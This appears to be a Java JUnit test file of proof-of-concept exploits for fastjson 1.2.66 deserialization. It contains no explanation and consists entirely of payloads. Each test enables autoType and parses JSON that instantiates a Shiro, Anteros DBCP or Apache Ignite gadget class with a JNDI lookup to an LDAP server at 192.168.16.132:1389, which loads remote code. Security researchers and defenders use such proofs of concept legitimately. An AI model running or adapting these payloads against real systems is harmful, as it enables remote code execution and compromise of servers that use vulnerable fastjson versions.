import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import org.junit.Test;

public class fastjson_1_2_66 {
    @Test
    public void shiroDemo() throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://192.168.16.132:1389/siflky\"}";
        payload = "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://192.168.16.132:1389/siflky\"], \"Realms\":[\"\"]}";
        Object jsonObject = JSON.parseObject(payload);
    }

    @Test
    public void anterosDemo() throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://192.168.16.132:1389/siflky\"}";
        payload = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://192.168.16.132:1389/siflky\"}";
        JSONObject jsonObject = JSON.parseObject(payload);
    }

    @Test
    public void igniteDemo() throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"ldap://192.168.16.132:1389/siflky\"}";
        JSONObject jsonObject = JSON.parseObject(payload);
    }
}
